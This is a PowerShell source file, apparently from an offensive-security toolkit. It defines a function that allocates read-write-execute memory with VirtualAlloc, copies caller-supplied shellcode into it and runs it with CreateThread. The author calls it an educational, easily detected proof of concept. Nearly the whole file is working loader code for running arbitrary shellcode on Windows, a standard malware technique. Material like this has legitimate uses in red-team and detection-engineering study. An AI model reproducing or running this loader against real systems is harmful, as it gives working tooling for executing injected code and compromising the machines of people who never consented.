function Invoke-ShellcodeViaLocalThread
{
<#
.SYNOPSIS
    This is a simple proof-of-concept for local shellcode execution using PowerShell and Windows API interop.
    The shellcode is written into memory allocated via VirtualAlloc with RWX permissions and executed via CreateThread.
    
    There’s nothing novel here — this method is well-known and widely used. It’s highly detectable
    by modern EDRs and serves primarily as an educational demonstration of shellcode execution in PowerShell.

    Unlike more sophisticated techniques (e.g., using indirect syscalls, NtCreateThreadEx, or manual mapping),
    this approach is straightforward and gets the job done for testing and lab environments.

    This function does not include obfuscation, encryption, or evasion strategies. Shellcode must be supplied
    in raw byte array format.
    
    Notes:
        - I tested this POC on x64 Win11.
        - You can only create an x64 processes on an x64 host architecture.

.DESCRIPTION
    Author: Silentis Vox (@SilentisVox)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

.PARAMETER Shellcode
    A byte array containing the raw shellcode to be executed.

.EXAMPLE
    # Create a local thread that executes shellcode.
    # x64 Win10 RS4
    PS C:\> Invoke-ShellcodeViaLocalThread -Shellcode $Shellcode -Verbose
    VERBOSE: [+] Allocated [272] Bytes To 0x1FF987C0000.
    VERBOSE: [+] Copied [272] Bytes To 0x1FF987C0000.
    VERBOSE: [+] Created Thread [14240] And Is Executing.
    VERBOSE: [+] Shellcode Successfully Executed.

#>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [Byte[]]$Shellcode
    )

    Add-Type @"
    using System;
    using System.Runtime.InteropServices;

    public class Kernel32
    {
        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
    }
"@

    # Initialize needed varaibles.

    $ShellcodeSize                      = $Shellcode.Length
    $InjectionAddress                   = $null
    $ThreadHandle                       = $null

    # Allocate memory to our process.

    $AddressPointer                     = [IntPtr]::Zero
    $ShellcodeSizePointer               = [UIntPtr]::New($ShellcodeSize)
    $MEM_COMMIT                         = 0x00001000
    $PAGE_EXECUTE_READWRITE             = 0x40

    $AllocatedMemoryAddress             = [Kernel32]::VirtualAlloc($AddressPointer, $ShellcodeSizePointer, $MEM_COMMIT, $PAGE_EXECUTE_READWRITE)
    
    if ($AllocatedMemoryAddress)
    {
        Write-Verbose ("[+] Allocated [$ShellcodeSize] Bytes To 0x{0:X}." -f $AllocatedMemoryAddress.ToInt64())
    }
    else
    {
        $FunctionError                  = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Verbose "[!] VirtualAlloc Failed: $FunctionError"
        $false
        return
    }

    # Write shellcode to the allocated memory.

    $ShellcodeStartIndex                = 0

    try
    {
        [Runtime.InteropServices.Marshal]::Copy($Shellcode, $ShellcodeStartIndex, $AllocatedMemoryAddress, $ShellcodeSize)
        Write-Verbose ("[+] Copied [$ShellcodeSize] Bytes To 0x{0:X}." -f $AllocatedMemoryAddress.ToInt64())
    }
    catch
    {
        Write-Verbose "[!] Failed To Copy Shellcode To Address: $($_.Exception.Message)"
        $false
        return
    }

    # Create a thread pointing to our memory.

    $ThreadAttributes                   = [IntPtr]::Zero
    $StackSize                          = [UIntPtr]::Zero
    $Parameter                          = [IntPtr]::Zero
    $CreationFlags                      = 0
    $ThreadId                           = $null

    $ThreadHandle                       = [Kernel32]::CreateThread($ThreadAttributes, $StackSize, $AllocatedMemoryAddress, $Parameter, $CreationFlags, [Ref] $ThreadId)

    $INVALID_THREAD_HANDLE              = 0xFFFFFFFF

    if (($ThreadHandle) -and ($ThreadHandle -ne $INVALID_THREAD_HANDLE))
    {
        Write-Verbose "[+] Created Thread [$ThreadId] And Is Executing."
    }
    else
    {
        $FunctionError                  = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Verbose "[!] CreateThread Failed: $FunctionError"
        $false
        return
    }

    # Wait for it to execute.

    $INFINITE                           = [UInt32]::MaxValue

    $Result                             = [kernel32]::WaitForSingleObject($ThreadHandle, $INFINITE)

    $WAIT_OBJECT_0                      = 0x00000000

    if ((-not $Result) -and ($Result -eq $WAIT_OBJECT_0))
    {
        Write-Verbose "[+] Shellcode Successfully Executed."
    }
    else
    {
        $FunctionError                  = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Verbose "[!] WaitForSingleObject Failed: $FunctionError"
        $false
        return
    }

    return $true
}